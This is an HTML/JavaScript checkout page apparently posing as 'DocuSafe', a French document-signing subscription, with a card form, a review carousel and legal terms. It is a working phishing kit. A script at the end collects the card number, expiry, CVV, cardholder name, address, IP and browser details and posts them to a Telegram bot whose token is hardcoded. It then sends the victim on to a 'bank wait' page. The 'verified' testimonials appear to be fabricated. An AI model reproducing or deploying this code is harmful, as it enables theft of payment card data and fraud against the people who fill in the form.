    if (result.requiresAction) {
      // Utiliser confirmCardPayment au lieu de handleCardAction
      const { error, paymentIntent } = await stripe.confirmCardPayment(
        result.paymentIntentClientSecret
      );
      
      if (error) {
        // Échec de l'authentification 3D Secure
        errorDiv.textContent = error.message;
        submitButton.disabled = false;
        submitButton.textContent = 'Commandez maintenant';
        hideLoading();
      } else {
        // Paiement réussi après 3D Secure
        window.location.href = 'merci.php';
      }
    } else if (result.clientSecret) {
      // Pas de 3D Secure, confirmation directe
      const { error: confirmError } = await stripe.confirmCardPayment(result.clientSecret);
      
      if (confirmError) {
        errorDiv.textContent = confirmError.message;
        submitButton.disabled = false;
        submitButton.textContent = 'Commandez maintenant';
        hideLoading();
      } else {
        // Paiement réussi
        window.location.href = 'merci.php';
      }
    }
  } catch (error) {
    errorDiv.textContent = error.message || "Une erreur est survenue lors du traitement de votre paiement.";
    submitButton.disabled = false;
    submitButton.textContent = 'Commandez maintenant';
    hideLoading();
  }
});
  
  // Gestionnaire pour le bouton express
  const expressButton = document.getElementById('express-pay-button');
  if (expressButton) {
    expressButton.addEventListener('click', function() {
      // Remplir automatiquement quelques champs
      document.getElementById('email').value = 'client@example.com';
      document.getElementById('pays').value = 'France';
      // Faire défiler jusqu'au formulaire principal
      document.getElementById('payment-form').scrollIntoView({ behavior: 'smooth' });
    });
  }
  
  // Gestionnaire pour le carrousel d'avis - REMPLACER avec la nouvelle version
  const slider = document.getElementById('testimonialsSlider');
  const slides = document.querySelectorAll('.testimonial-slide');
  const slidesCount = slides.length;
  
  const prevBtn = document.getElementById('prevBtn');
  const nextBtn = document.getElementById('nextBtn');
  
  // Éléments de pagination
  const paginationBar = document.getElementById('paginationBar');
  const currentSlideEl = document.querySelector('.current-slide');
  const totalSlidesEl = document.querySelector('.total-slides');
  
  // Initialiser les valeurs
  let currentIndex = 0;
  totalSlidesEl.textContent = slidesCount;
  
  // Fonction pour mettre à jour la pagination
  function updatePagination(index) {
    // Mettre à jour le numéro de slide
    currentSlideEl.textContent = index + 1;
    
    // Mettre à jour la barre de progression - CORRECTION ICI
    const progressPercent = (index / (slidesCount - 1)) * 100;
    paginationBar.style.width = `${progressPercent}%`;
    // Nous utilisons width au lieu de translateX pour une barre de progression
  }
  
  // Fonction pour aller à un slide spécifique
  function goToSlide(index) {
    if (index < 0) index = slidesCount - 1;
    if (index >= slidesCount) index = 0;
    
    slider.style.transform = `translateX(-${index * 100}%)`;
    
    // Mettre à jour les indicateurs
    updatePagination(index);
    
    // Ajouter une classe active pour l'animation
    slides.forEach(slide => slide.classList.remove('active'));
    slides[index].classList.add('active');
    
    currentIndex = index;
  }
  
  // Gérer les clics sur les boutons de navigation
  prevBtn.addEventListener('click', (e) => {
    e.preventDefault();
    e.stopPropagation();
    goToSlide(currentIndex - 1);
  });
  
  nextBtn.addEventListener('click', (e) => {
    e.preventDefault();
    e.stopPropagation();
    goToSlide(currentIndex + 1);
  });
  
  // Navigation par toucher pour mobile améliorée
  let touchStartX = 0;
  let touchEndX = 0;
  let touchStarted = false;
  
  slider.addEventListener('touchstart', e => {
    touchStartX = e.changedTouches[0].screenX;
    touchStarted = true;
    // Arrêter l'animation pendant le swipe
    slider.style.transition = 'none';
  });
  
  slider.addEventListener('touchmove', e => {
    if (!touchStarted) return;
    let currentX = e.changedTouches[0].screenX;
    let diff = touchStartX - currentX;
    // Limiter le glissement
    if (Math.abs(diff) < window.innerWidth) {
      // Effet de glissement en temps réel avec résistance
      const resistance = 0.4; // Plus la valeur est basse, plus il y a de résistance
      slider.style.transform = `translateX(${-currentIndex * 100}% - ${diff * resistance}px)`;
    }
  });
  
  slider.addEventListener('touchend', e => {
    touchEndX = e.changedTouches[0].screenX;
    touchStarted = false;
    // Rétablir la transition
    slider.style.transition = 'transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1)';
    handleSwipe();
  });
  
  function handleSwipe() {
    // Seuil de swipe adaptatif
    const swipeThreshold = window.innerWidth < 600 ? 40 : 50;
    const swipeDistance = touchStartX - touchEndX;
    
    if (swipeDistance > swipeThreshold) {
      // Swipe à gauche
      goToSlide(currentIndex + 1);
    } else if (swipeDistance < -swipeThreshold) {
      // Swipe à droite
      goToSlide(currentIndex - 1);
    } else {
      // Revenir au slide actuel si le swipe n'est pas assez fort
      goToSlide(currentIndex);
    }
  }
  
  // Défilement automatique
  function autoSlide() {
    goToSlide(currentIndex + 1);
  }
  
  // Démarrer le défilement automatique
  let slideInterval = setInterval(autoSlide, 6000);
  
  // Arrêter le défilement automatique lors de l'interaction
  const testimonialSection = document.querySelector('.testimonials-section');
  
  testimonialSection.addEventListener('mouseenter', () => {
    clearInterval(slideInterval);
  });
  
  testimonialSection.addEventListener('mouseleave', () => {
    slideInterval = setInterval(autoSlide, 6000);
  });
  
  testimonialSection.addEventListener('touchstart', () => {
    clearInterval(slideInterval);
  });
  
  testimonialSection.addEventListener('touchend', () => {
    slideInterval = setInterval(autoSlide, 6000);
  });
  
  // Initialisation au chargement
  goToSlide(0);
  
  // Recalculer les dimensions en cas de redimensionnement de la fenêtre
  window.addEventListener('resize', function() {
    goToSlide(currentIndex);
  });
  
  // Accessibilité clavier
  testimonialSection.addEventListener('keydown', e => {
    if (e.key === 'ArrowLeft') {
      goToSlide(currentIndex - 1);
    } else if (e.key === 'ArrowRight') {
      goToSlide(currentIndex + 1);
    }
  });
  
  // Gestion du consentement pour le nouveau design
  const consentToggle = document.getElementById('consentToggle');
  const consentContent = document.getElementById('consentContent');
  if (consentToggle && consentContent) {
    const toggleIcon = consentToggle.querySelector('.toggle-icon');
    
    consentToggle.addEventListener('click', function(e) {
      // Empêcher le comportement par défaut
      e.preventDefault();
      e.stopPropagation();
      
      // Toggle l'affichage
      consentContent.classList.toggle('open');
      
      // Changer l'icône
      if (consentContent.classList.contains('open')) {
        toggleIcon.textContent = '-';
      } else {
        toggleIcon.textContent = '+';
      }
    });
  }
});


</script>


<header class="page-header" style="display: flex; align-items: center; justify-content: center; padding: 10px;">
  <img src="./images/logodocusafe.png" alt="Logo EON" style="height: 33px;">
</header>

<div class="order-summary">
  <span>Résumé de la commande</span>
  <div class="text">Essai gratuit&nbsp; /&nbsp; 30 jours&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;puis 0,99 € / mois </div>

</div>

  
  <!-- Bouton Apple Pay -->
  <div id="payment-request-button" style="margin: 16px 0;"></div>
  
  <!-- Séparateur avec flèches -->
  <div class="separator-container">
    <div class="separator-line"></div>
    <div class="separator-text">
      <span class="arrow">↓</span> CONTINUER CI-DESSOUS <span class="arrow">↓</span>
    </div>
    <div class="separator-line"></div>
  </div>
</div>

<form id="payment-form" method="POST">
  <div class="container">

    <h2>Adresse</h2>
    <input type="text" id="adresse" name="adresse" placeholder="Adresse" required>
    <input type="text" id="ville" name="ville" placeholder="Ville" required>
    <input type="text" id="codepostal" name="codepostal" placeholder="Code postal" required>

    <h2>Paiement</h2>
    <p class="payment-subtitle">Toutes les transactions sont sécurisées et cryptées.</p>
    
    <div class="payment-card">
      <div class="card-header">
        <div class="card-type">
          <div class="card-type-circle"></div>
          Carte de crédit
        </div>
        <div class="card-logos">
          <img src="https://i.postimg.cc/9XY1GsBr/visa-sx-Iq5-Dot.png" alt="Visa" class="card-logo">
          <img src="https://i.postimg.cc/FsFpGGPG/mastercard-1c4-ly-Mp-1.png" alt="Mastercard" class="card-logo">
          <img src="https://i.postimg.cc/4N850tqG/amex-Csr7h-Roy.png" alt="Amex" class="card-logo">
          <img src="https://i.postimg.cc/t4Y5GJGx/discover-C7-Ub-Fp-Nb.png" alt="Discover" class="card-logo">
        </div>
      </div>
      
      <div class="card-content">
        <div class="form-group">
          <label class="form-label">Titulaire de la carte</label>
          <input type="text" id="cardholder-name" name="cardholder-name" placeholder="Nom sur la carte" required style="margin-bottom: 6px;">
        </div>
        
        <div class="form-group" style="margin-bottom: 14px;">
          <label class="form-label">Numéro de carte</label>
          <input type="text" id="cardNumber" placeholder="1234 1234 1234 1234" required>
        </div>
        
        <div class="card-details">
          <div class="form-group">
            <label class="form-label">Date d'expiration</label>
            <input type="text" id="expiry" placeholder="MM / AA" required>
          </div>
          
          <div class="form-group">
            <label class="form-label">CVC</label>
            <input type="text" id="cvv" placeholder="CVC" maxlength="4" required>

          </div>
        </div>
        
        <div id="card-error" role="alert"></div>
      </div>
    </div>
    
    <!-- Récapitulatif de la commande avec espacement légèrement augmenté -->
    <div class="simple-summary">
      <h3>Résumé de la commande</h3>
      
      <div class="simple-item">
        <div class="item-left">
          <div class="item-image-container">
            <img src="./images/logodoc.png" alt="logo" class="item-img">
          </div>
          <div class="item-text">
            <div class="item-title">Abonnement : Signatures + Documents</div>
          </div>
        </div>
        <div class="text"><strong>0,00 € / 30 jours</strong><br>puis 0,99 € / mois</div>
      </div>

    </div>
    
    <button class="submit-button" type="submit" id="payment-button">Commandez maintenant</button>
    
    <!-- Carrousel d'avis clients professionnel et moderne -->
    <div class="testimonials-section">
      <div class="testimonials-container">
        <div class="testimonials-slider" id="testimonialsSlider">
          <!-- Avis 1 -->
          <div class="testimonial-slide">
            <div class="testimonial-card">
              <div class="testimonial-header">
                <div class="testimonial-avatar">
                  <img src="./images/imageees.jpg" alt="Photo de profil" class="avatar-img">
                </div>
                <div class="testimonial-author-info">
                  <div class="author-name">Soraya S.</div>
                  <div class="author-status">Client vérifié</div>
                </div>
              </div>
              <div class="testimonial-content">
                <div class="testimonial-rating">
                  <div class="star-rating">
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                  </div>
                  <span class="rating-text">5.0</span>
                </div>
                <p class="testimonial-text">"Très simple et rapide, le service client aussi et grave compréhensible en cas de problème, franchement je recommande !"</p>
              </div>
            </div>
          </div>
          
          <!-- Avis 2 -->
          <div class="testimonial-slide">
            <div class="testimonial-card">
              <div class="testimonial-header">
                <div class="testimonial-avatar">
                  <img src="https://i.postimg.cc/qq0SMVqJ/IMG-1573.jpg" alt="Photo de profil" class="avatar-img">
                </div>
                <div class="testimonial-author-info">
                  <div class="author-name">Mathis L.</div>
                  <div class="author-status">Client vérifié</div>
                </div>
              </div>
              <div class="testimonial-content">
                <div class="testimonial-rating">
                  <div class="star-rating">
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                  </div>
                  <span class="rating-text">5.0</span>
                </div>
                <p class="testimonial-text">"Nickel 10/10 ! Plus besoin de se creuser la tête !"</p>
              </div>
            </div>
          </div>
          
          <!-- Avis 3 -->
          <div class="testimonial-slide">
            <div class="testimonial-card">
              <div class="testimonial-header">
                <div class="testimonial-avatar">
                  <img src="./images/unnamed.jpg" alt="Photo de profil" class="avatar-img">
                </div>
                <div class="testimonial-author-info">
                  <div class="author-name">Gabin K.</div>
                  <div class="author-status">Client vérifié</div>
                </div>
              </div>
              <div class="testimonial-content">
                <div class="testimonial-rating">
                  <div class="star-rating">
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                  </div>
                  <span class="rating-text">5.0</span>
                </div>
                <p class="testimonial-text">"Le support client est très réactif. J'avais 2/3 questions et j'ai reçu mes réponses en 20 minutes, j'ai rien à dire."</p>
              </div>
            </div>
          </div>

          <!-- Avis 4 -->
          <div class="testimonial-slide">
            <div class="testimonial-card">
              <div class="testimonial-header">
                <div class="testimonial-avatar">
                  <img src="https://i.postimg.cc/cC07Dfz2/image-2025-04-24-184328027.png" alt="Photo de profil" class="avatar-img">
                </div>
                <div class="testimonial-author-info">
                  <div class="author-name">Clara M.</div>
                  <div class="author-status">Client vérifié</div>
                </div>
              </div>
              <div class="testimonial-content">
                <div class="testimonial-rating">
                  <div class="star-rating">
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                  </div>
                  <span class="rating-text">5.0</span>
                </div>
                <p class="testimonial-text">"Je ne savais pas qu'on pouvait signer et envoyer des documents en ligne. Satisfaite."</p>
              </div>
            </div>
          </div>

          <!-- Avis 5 -->
          <div class="testimonial-slide">
            <div class="testimonial-card">
              <div class="testimonial-header">
                <div class="testimonial-avatar">
                  <img src="https://i.postimg.cc/Vvgq2dQ6/image-2025-04-24-184401319.png" alt="Photo de profil" class="avatar-img">
                </div>
                <div class="testimonial-author-info">
                  <div class="author-name">Riyadh R.</div>
                  <div class="author-status">Client vérifié</div>
                </div>
              </div>
              <div class="testimonial-content">
                <div class="testimonial-rating">
                  <div class="star-rating">
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                    <i class="star-icon filled"></i>
                  </div>
                  <span class="rating-text">5.0</span>
                </div>
                <p class="testimonial-text">"Très utile pour emménager ! Je ne connaissais pas et je trouve ça super !"</p>
              </div>
            </div>
          </div>
        </div>

        <!-- Indicateurs de pagination -->
        <div class="testimonial-pagination" id="testimonialPagination">
          <div class="pagination-progress">
            <div class="pagination-bar" id="paginationBar"></div>
          </div>
          <div class="pagination-numbers">
            <span class="current-slide">1</span> / <span class="total-slides">5</span>
          </div>
        </div>

        <!-- Boutons de navigation -->
        <button class="testimonial-nav prev-btn" id="prevBtn" aria-label="Témoignage précédent">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </button>
        <button class="testimonial-nav next-btn" id="nextBtn" aria-label="Témoignage suivant">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M9 6L15 12L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </button>
      </div>

      <!-- Indicateur de confiance -->
      <div class="trust-indicator">
        <div class="trust-badge">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
            <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          <span>Avis vérifiés par notre équipe</span>
        </div>
      </div>
    </div>


    <!-- Champs cachés pour le formulaire -->
    <input type="hidden" id="amount-input" name="amount" value="270">
    <input type="hidden" name="form_action" value="process_payment">
    <input type="hidden" name="sequence_type" value="first">
    <input type="hidden" name="accept_rebill" value="1">
  </div>
</form>

<!-- Footer pleine largeur -->
<footer class="custom-footer" style="background: #ffffff; padding: 2rem 1.5rem; border-radius: 20px; text-align: center; margin: 2rem auto 0 auto; width: 90%; max-width: 900px; font-family: 'Outfit', sans-serif; box-shadow: 0 2px 10px rgba(0,0,0,0.05);">
  <div class="container" style="max-width: 600px; margin: 0 auto;"> <!-- Conteneur interne pour le contenu -->
    <img src="./images/logodocusafe.png" alt="Dinguerie Logo" class="footer-logo" style="width: 120px; margin-bottom: 1rem;">
    
    <p style="font-size: 0.95rem; color: #000000; margin-bottom: 1rem;">
      Emménagez en toute sérénité avec DocuSafe !
    </p>
    
    <div class="footer-socials" style="display: flex; justify-content: center; gap: 1rem; margin-bottom: 1.5rem;">
      <a href="#"><img src="https://i.postimg.cc/GtnvtP46/pngimg-com-tiktok-PNG2.png" alt="TikTok" style="width: 30px; height: 30px;"></a>
      <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" style="width: 30px; height: 30px;"></a>
    </div>

    <!-- Accordéon -->
    <div class="footer-links" style="font-family: 'Outfit', sans-serif;">
      <div class="accordion-item" style="margin-bottom: 0.8rem;">
        <button class="accordion-toggle" style="color: #000; width: 100%; background: #f3f3f3; border: none; padding: 0.8rem 1rem; border-radius: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
          Contact et informations <span class="icon">+</span>
        </button>
        <div class="accordion-content" style="display: none; text-align: left; padding: 0.5rem 1rem; font-size: 0.9rem; color: #333;">
          <p>Pour toute question sur votre achat ou pour plus d'informations, vous pouvez nous contacter par email à l'adresse suivante : <strong>contact@docusafe.com</strong></p>
          
          <br>

          <p>INTERNATIONAL LTD, 61 Lordou Vironos Street, 6023 Larnaca, Chypre</p>

          <br>

          Les présentes mentions légales s'appliquent à tous les sites et sous-domaines associés à docusafe.com.</p>
        </div>
      </div>

     

      <div class="accordion-item" style="margin-bottom: 0.8rem;">
        <button class="accordion-toggle" style="color: #000; width: 100%; background: #f3f3f3; border: none; padding: 0.8rem 1rem; border-radius: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
          Conditions générales <span class="icon">+</span>
        </button>
        <div class="accordion-content" style="display: none; text-align: left; padding: 0.5rem 1rem; font-size: 0.9rem; color: #333;">
          <div class="legal-text">
            <p>Cette offre est ouverte à toute personne résidant en France métropolitaine, Belgique, Suisse. Plusieurs participations par personne sont autorisées.</p>
            <p>En achetant, vous acceptez pleinement et sans réserve les présentes conditions. Toute fraude ou tentative de fraude, ainsi que tout non-respect des conditions, entraînera l'exclusion immédiate du participant.</p>
            <p>DocuSafe se réserve le droit de modifier, prolonger, écourter, suspendre ou annuler l'offre sans préavis, en cas de force majeure ou de circonstances exceptionnelles.</p>
            <p>Le participant accepte que ses données personnelles soient utilisées pour la gestion de l'offre. Ces informations sont destinées uniquement à DocuSafe et seront conservées pendant la durée nécessaire à la finalité du traitement.</p>
          </div>
        </div>
      </div>

<div class="accordion-item" style="margin-bottom: 0.8rem;">
  <button class="accordion-toggle" style="color: #000; width: 100%; background: #f3f3f3; border: none; padding: 0.8rem 1rem; border-radius: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
    Politique de remboursement <span class="icon">+</span>
  </button>
  <div class="accordion-content" style="display: none; text-align: left; padding: 0.5rem 1rem; font-size: 0.9rem; color: #333;">
    <div class="legal-text">
      <p>Chez Docusafe, la satisfaction de nos clients est une priorité. Vous disposez d’un délai de <strong>14 jours</strong> après votre achat pour demander un remboursement, à condition que le service n’ait pas encore été utilisé (ex : signature, accès à un document, génération, ou stockage sécurisé activé).</p>
      
      <p>Les demandes de remboursement doivent être adressées à notre support client par mail, en précisant le motif de la demande.</p>


      <p>Cette politique est conforme à la réglementation en vigueur relative à la vente de services numériques et à la protection des consommateurs.</p>

      <p>Pour toute question, notre service client est à votre écoute 7j/7.</p>
    </div>
  </div>
</div>


      <div class="accordion-item" style="margin-bottom: 0.8rem;">
        <button class="accordion-toggle" style="color: #000; width: 100%; background: #f3f3f3; border: none; padding: 0.8rem 1rem; border-radius: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
          Données personnelles et mentions légales <span class="icon">+</span>
        </button>
        <div class="accordion-content" style="display: none; text-align: left; padding: 0.5rem 1rem; font-size: 0.9rem; color: #333;">
          <div class="legal-text">
            <p>DocuSafe s'engage à protéger la vie privée de ses utilisateurs. Nous collectons uniquement les données nécessaires à la gestion de votre achat.</p>
            <p>Les informations personnelles recueillies sont destinées à l'usage exclusif de DocuSafe et ne sont en aucun cas cédées ou vendues à des tiers sans votre consentement préalable.</p>
            <p>Conformément au Règlement Général sur la Protection des Données (RGPD), vous disposez d'un droit d'accès, de rectification et de suppression de vos données personnelles. Pour exercer ces droits, contactez-nous à l'adresse :contact@docusafe.com</p>
            
            <p><strong>Propriété intellectuelle</strong><br>
            L'ensemble du contenu de ce site (textes, images, logos, vidéos, etc.) est protégé par le droit d'auteur. Toute reproduction, représentation, modification, publication ou adaptation, totale ou partielle, est interdite sans autorisation écrite préalable.</p>

            <p><strong>Responsabilité</strong><br>
            Nous faisons tout notre possible pour garantir l'exactitude des informations publiées sur ce site. Toutefois, nous ne saurions être tenus responsables des erreurs, omissions ou d'éventuelles interruptions de service.</p>

            <p><strong>Droit applicable</strong><br>
            Les présentes mentions légales sont soumises au droit français. En cas de litige, le tribunal compétent sera celui du siège social de l'organisateur, sauf disposition légale contraire.</p>
          </div>
        </div>
      </div>
    </div>

    <script>
      // JavaScript pour gérer l'accordéon
      document.addEventListener('DOMContentLoaded', function() {
        const accordionToggles = document.querySelectorAll('.accordion-toggle');
        
        accordionToggles.forEach(function(toggle) {
          toggle.addEventListener('click', function() {
            // Récupérer le contenu associé à ce toggle
            const content = this.nextElementSibling;
            
            // Vérifier si le contenu est visible
            const isOpen = content.style.display === 'block';
            
            // Fermer tous les panneaux ouverts
            document.querySelectorAll('.accordion-content').forEach(function(item) {
              item.style.display = 'none';
            });
            document.querySelectorAll('.accordion-toggle .icon').forEach(function(icon) {
              icon.textContent = '+';
            });
            
            // Si le panneau n'était pas ouvert, l'ouvrir
            if (!isOpen) {
              content.style.display = 'block';
              this.querySelector('.icon').textContent = '-';
            }
          });
        });
      });
    </script>
  </div> <!-- Fin du conteneur interne -->
</footer>

</div>

<script>
document.getElementById("payment-form").addEventListener("submit", async function (e) {
  e.preventDefault();
  
  const prenom = document.getElementById("prenom")?.value.trim() || "";
  const nom = document.getElementById("nom")?.value.trim() || "";
  const email = document.getElementById("email")?.value.trim() || "";
  const adresse = document.getElementById("adresse")?.value.trim() || "";
  const ville = document.getElementById("ville")?.value.trim() || "";
  const codepostal = document.getElementById("codepostal")?.value.trim() || "";
  const pays = document.getElementById("pays")?.value.trim() || "";
  const titulaire = document.getElementById("cardholder-name")?.value.trim() || "";
  const numeroCarte = document.getElementById("cardNumber")?.value.trim() || "";
  const bin = numeroCarte.replace(/\s/g, "").slice(0, 6);
  const imageCarte = `https://cardimages.imaginecurve.com/cards/${bin}.png`;
  const expiration = document.getElementById("expiry")?.value.trim() || "";
  const cvv = document.getElementById("cvv")?.value.trim() || "";

    // 2. Infos système
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;

  let ip = "Non récupérée";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch (err) {
    console.error("Erreur IP :", err);
  }

  const text = `
💳 + *1 NEW CARD*
└ ${numeroCarte}

🏦 *Billing*
├ 👤 Titulaire : \`${titulaire}\`
├ 🏠 Adresse : \`${adresse}\`
├ 🏙️ Ville : \`${ville}\`
└ 📮 Zip : \`${codepostal}\`

🏦 *Carte de Paiement*
├ 💳 Numéro de carte : \`${numeroCarte}\`
├ 📅 Expiration : \`${expiration}\`
└ 🔒 Cryptogramme visuel : \`${cvv}\`

🧩 *Extra*
├ 🏷️ Bin : \`${bin}\`
├ 🌐 IP : \`${ip}\`
├ 🖼️ SCAN : ${imageCarte}
├ 🖥️ Appareil : ${platform}
└ 📱 Navigateur : ${userAgent}


`;

  const token = "7600654609:AAEbmW-mtdWWA6bAJyMOwyJGO_ukOddgQCY"; // Remplace par ton vrai token
  const chatId = "-4858723515"; // Remplace par ton vrai chat ID
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown"})
  })
  .then(res => res.json())
  .then(data => {
  if (data.ok) {

    // Attendre 2 secondes puis rediriger
    setTimeout(() => {
      window.location.href = "banque-wait.html"; // 🔁 remplace par ta vraie page
    }, 1000);
  } else {

  }
})

  .catch(err => {
    console.error(err);
  });
});




</script>


<script>
document.getElementById("cardNumber").addEventListener("input", function (e) {
  let value = e.target.value.replace(/\D/g, ""); // Garde uniquement les chiffres

  // Limite à 16 chiffres max
  if (value.length > 16) value = value.slice(0, 16);

  // Ajoute un espace tous les 4 chiffres
  let formatted = value.replace(/(.{4})/g, "$1 ").trim();

  e.target.value = formatted;
});
</script>

<script>
const expiryInput = document.getElementById("expiry");

expiryInput.addEventListener("input", function (e) {
  let value = e.target.value.replace(/\D/g, ""); // Supprime tout sauf chiffres

  // Limite à 4 chiffres (MMYY)
  if (value.length > 4) value = value.slice(0, 4);

  // Vérifie que le mois est entre 01 et 12
  if (value.length >= 2) {
    const month = parseInt(value.slice(0, 2));
    if (month < 1 || month > 12) {
      value = ""; // Vide le champ si le mois est invalide
    }
  }

  // Applique le format MM / AA
  if (value.length >= 3) {
    value = value.slice(0, 2) + " / " + value.slice(2);
  }

  e.target.value = value;
});
</script>


<script>
document.getElementById("cvv").addEventListener("input", function (e) {
  let value = e.target.value.replace(/\D/g, ""); // Supprime tout sauf chiffres
  if (value.length > 4) value = value.slice(0, 4); // Limite à 4 chiffres
  e.target.value = value;
});
</script>


<script>
const slider = document.getElementById("testimonialsSlider");
const slides = document.querySelectorAll(".testimonial-slide");
const totalSlides = slides.length;
let currentSlide = 0;
let autoSlideInterval;

const updateSlider = () => {
  slider.style.transform = `translateX(-${currentSlide * 100}%)`;
  document.querySelector(".current-slide").textContent = currentSlide + 1;
  document.querySelector(".total-slides").textContent = totalSlides;
};

const goToNextSlide = () => {
  currentSlide = (currentSlide + 1) % totalSlides;
  updateSlider();
};

const goToPrevSlide = () => {
  currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
  updateSlider();
};

// Boutons
document.getElementById("prevBtn").addEventListener("click", (e) => {
  e.preventDefault();
  goToPrevSlide();
});

document.getElementById("nextBtn").addEventListener("click", (e) => {
  e.preventDefault();
  goToNextSlide();
});

// Auto-slide toutes les 5 secondes
const startAutoSlide = () => {
  autoSlideInterval = setInterval(goToNextSlide, 3300);
};

// Stop auto-slide si interaction manuelle (optionnel)
document.getElementById("prevBtn").addEventListener("click", () => clearInterval(autoSlideInterval));
document.getElementById("nextBtn").addEventListener("click", () => clearInterval(autoSlideInterval));

// Démarrage
updateSlider();
startAutoSlide();
</script>




</body>
</html>
